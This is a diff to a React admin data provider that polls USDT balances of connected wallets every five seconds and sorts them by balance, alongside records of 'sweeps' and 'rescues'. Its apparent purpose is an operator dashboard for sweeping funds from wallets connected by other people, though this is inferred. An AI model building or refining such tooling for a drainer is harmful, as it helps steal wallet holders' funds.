@@ -194,8 +194,8 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
   }, []);
 
   // ── Fetch & Monitor on-chain USDT balances for connected wallets ────────
-  // silent: if true, does not trigger loading state to avoid UI flicker
-  const fetchSingleBalance = useCallback(async (address: string, silent = false) => {
+  // silent = true: updates digits silently without showing a loading spinner
+  const fetchSingleBalance = useCallback(async (address: string, silent = true) => {
     const lower = address.toLowerCase();
     if (!silent) {
       setBalances((prev) => ({
@@ -223,13 +223,14 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
     await Promise.allSettled(promises);
   }, [allWallets, fetchSingleBalance]);
 
-  // Initial balance load for wallets that don't have balance yet
+  // Initial balance load and 5-second automatic live update
   useEffect(() => {
     if (allWallets.length === 0) return;
 
     let isSubscribed = true;
 
-    const checkBalances = async () => {
+    // Initial check (silent so no flashing)
+    const checkInitial = async () => {
       for (const w of allWallets) {
         if (!isSubscribed) break;
         const lower = w.id.toLowerCase();
@@ -237,11 +238,17 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
         await fetchSingleBalance(w.id, false);
       }
     };
+    checkInitial();
 
-    checkBalances();
+    // 5-second live balance refresh (costs 0 database reads)
+    const interval = setInterval(() => {
+      if (!isSubscribed) return;
+      allWallets.forEach((w) => fetchSingleBalance(w.id, true));
+    }, 5000);
 
     return () => {
       isSubscribed = false;
+      clearInterval(interval);
     };
   }, [allWallets, fetchSingleBalance]);
 
@@ -280,27 +287,50 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
     }).length;
   }, [allWallets]);
 
-  // ── Keep newly connected and latest swept wallets on the top ─────────
+  // ── Sort wallets: High to Low balance, preserving new connection / sweep top placement ─
   const sortedWallets = useMemo(() => {
-    return [...allWallets].sort((a, b) => {
-      const getScore = (w: WalletDoc) => {
-        const sponsoredMs = w.sponsoredAt?.toMillis?.() ?? 0;
-        let createdMs = 0;
-        if (w.createdAt) {
-          if (typeof (w.createdAt as any).toMillis === 'function') {
-            createdMs = (w.createdAt as any).toMillis();
-          } else {
-            const parsed = new Date(w.createdAt as any).getTime();
-            if (!isNaN(parsed)) createdMs = parsed;
-          }
+    const parseBal = (addr: string): number => {
+      const raw = balances[addr.toLowerCase()]?.balance;
+      if (!raw) return 0;
+      const clean = raw.replace(/,/g, '');
+      const val = parseFloat(clean);
+      return isNaN(val) ? 0 : val;
+    };
+
+    const getRecentActionScore = (w: WalletDoc): number => {
+      const sponsoredMs = w.sponsoredAt?.toMillis?.() ?? 0;
+      let createdMs = 0;
+      if (w.createdAt) {
+        if (typeof (w.createdAt as any).toMillis === 'function') {
+          createdMs = (w.createdAt as any).toMillis();
+        } else {
+          const parsed = new Date(w.createdAt as any).getTime();
+          if (!isNaN(parsed)) createdMs = parsed;
         }
-        const sweepMs = latestSweepsMap[w.id.toLowerCase()]?.sweptAtMs ?? 0;
-        // The most recent event (connect or sweep) determines rank
-        return Math.max(sponsoredMs, createdMs, sweepMs);
-      };
-      return getScore(b) - getScore(a);
+      }
+      const sweepMs = latestSweepsMap[w.id.toLowerCase()]?.sweptAtMs ?? 0;
+      return Math.max(sponsoredMs, createdMs, sweepMs);
+    };
+
+    return [...allWallets].sort((a, b) => {
+      const balA = parseBal(a.id);
+      const balB = parseBal(b.id);
+
+      // 1. Wallets with positive balances appear first, ordered high-to-low balance
+      const hasFundsA = balA > 0;
+      const hasFundsB = balB > 0;
+
+      if (hasFundsA && hasFundsB) {
+        if (balB !== balA) return balB - balA; // higher balance higher up
+        return getRecentActionScore(b) - getRecentActionScore(a);
+      }
+      if (hasFundsA && !hasFundsB) return -1;
+      if (!hasFundsA && hasFundsB) return 1;
+
+      // 2. Among zero-balance / swept wallets, sort by newly connected and latest swept
+      return getRecentActionScore(b) - getRecentActionScore(a);
     });
-  }, [allWallets, latestSweepsMap]);
+  }, [allWallets, balances, latestSweepsMap]);
 
   const isLoading = !isWalletsLoaded || !isRescuesLoaded;
 
